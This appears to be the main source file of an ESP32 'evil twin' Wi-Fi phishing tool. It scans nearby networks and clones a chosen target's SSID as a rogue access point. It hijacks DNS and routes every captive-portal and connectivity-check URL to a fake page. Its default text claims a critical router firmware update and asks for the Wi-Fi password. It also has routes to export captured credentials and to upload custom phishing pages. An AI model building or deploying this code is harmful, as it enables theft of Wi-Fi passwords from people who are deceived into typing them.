#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <esp_wifi.h>

#include "config.h"
#include "types.h"
#include "generated_htmls.h"
#include "utils.h"
#include "wifi_core.h"
#include "dns_core.h"
#include "storage.h"
#include "web_admin.h"
#include "web_captive.h"
#include "web_config.h"
#include "web_export.h"

WebServer webServer(80);
DNSServer dnsServer;

std::vector<NetworkRecord> discoveredNetworks;
NetworkRecord activeTarget;
AttackProfile attackConfig;

String currentRogueSsid = "";
unsigned long previousScanTime = 0;
bool isRogueApRunning = false;
unsigned long rogueApStartTime = 0;

static void registerAdminRoutes() {
    webServer.on("/admin", []() {
        serveAdminPanel(webServer, discoveredNetworks, activeTarget,
                        isRogueApRunning, currentRogueSsid, previousScanTime);
    });

    webServer.on("/control", HTTP_POST, []() {
        String action = webServer.arg("action");
        if (action == "start") {
            if (launchRogueAP(activeTarget, activeTarget.password, AP_IP_ADDR)) {
                isRogueApRunning = true;
                currentRogueSsid = activeTarget.ssid;
                rogueApStartTime = millis();
                initDnsHijack(dnsServer, DNS_PORT, AP_IP_ADDR);
            }
        } else {
            isRogueApRunning = false;
            haltRogueAP();
            stopDnsHijack(dnsServer);
            initDnsHijack(dnsServer, DNS_PORT, AP_IP_ADDR);
        }
        handleControlAction(webServer);
    });

    webServer.on("/scan", []() {
        scanNearbyNetworks(discoveredNetworks);
        previousScanTime = millis();
        handleScanRequest(webServer);
    });

    webServer.on("/select", HTTP_POST, []() {
        handleNetworkSelect(webServer, discoveredNetworks, activeTarget);
    });

    webServer.on("/clear-logs", HTTP_POST, []() {
        handleClearCredentials(webServer);
    });
}

static void registerCaptiveRoutes() {
    webServer.on("/", HTTP_GET, []() {
        serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid);
    });
    webServer.on("/", HTTP_POST, []() {
        serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid);
    });

    webServer.on("/login", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/login", HTTP_POST, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/login.php", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/login.php", HTTP_POST, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/submit", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/submit", HTTP_POST, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/post", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/user", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/action", HTTP_GET, []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/generate_204", []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/gen_204", []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/ncsi.txt", []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });
    webServer.on("/hotspot-detect.html", []() { serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid); });

    webServer.onNotFound([]() {
        serveCaptivePortal(webServer, isRogueApRunning, activeTarget.password.length() > 0, currentRogueSsid);
    });
}

static void registerConfigRoutes() {
    webServer.on("/config", []() {
        serveConfigPage(webServer, attackConfig);
    });

    webServer.on("/save-config", HTTP_POST, []() {
        applyConfigChanges(webServer, attackConfig);
    });

    webServer.on("/upload", []() {
        serveUploadPage(webServer);
    });

    webServer.on("/save-html", HTTP_POST, []() {
        applyHtmlUpload(webServer);
    });
}

static void registerExportRoutes() {
    webServer.on("/export", []() {
        serveCredentialExport(webServer);
    });
}

static void checkAutoStopTimer() {
    if (!isRogueApRunning || !attackConfig.autoStopEnabled) return;
    if (attackConfig.autoStopMinutes == 0) return;

    unsigned long elapsedMinutes = (millis() - rogueApStartTime) / 60000UL;
    if (elapsedMinutes >= attackConfig.autoStopMinutes) {
        Serial.println("[INFO] Auto-stop timer expired, halting rogue AP");
        isRogueApRunning = false;
        haltRogueAP();
        stopDnsHijack(dnsServer);
        initDnsHijack(dnsServer, DNS_PORT, AP_IP_ADDR);
    }
}

void setup() {
    Serial.begin(115200);
    SPIFFS.begin(true);

    WiFi.mode(WIFI_AP_STA);
    configureCountryRegion();

    WiFi.softAPConfig(AP_IP_ADDR, AP_IP_ADDR, AP_SUBNET);
    WiFi.softAP(DEFAULT_AP_SSID, DEFAULT_AP_PASS);
    initDnsHijack(dnsServer, DNS_PORT, AP_IP_ADDR);

    attackConfig.pageTitle = "Firmware Update Required";
    attackConfig.pageSubtitle = "SYSTEM MAINTENANCE MODE";
    attackConfig.pageBody = "Your router requires a critical firmware update.<br><br>Please enter your WiFi password.";
    attackConfig.useCustomHtml = false;
    attackConfig.customHtmlFile = "";
    attackConfig.autoStopEnabled = AUTO_STOP_DEFAULT;
    attackConfig.autoStopMinutes = AUTO_STOP_MINUTES;

    loadAttackConfig(attackConfig);

    registerAdminRoutes();
    registerCaptiveRoutes();
    registerConfigRoutes();
    registerExportRoutes();

    webServer.begin();

    Serial.println("[INFO] System initialized");
    scanNearbyNetworks(discoveredNetworks);
    previousScanTime = millis();
}

void loop() {
    processDnsRequests(dnsServer);
    webServer.handleClient();

    if (millis() - previousScanTime > SCAN_INTERVAL_MS && !isRogueApRunning) {
        scanNearbyNetworks(discoveredNetworks);
        previousScanTime = millis();
    }

    checkAutoStopTimer();
}
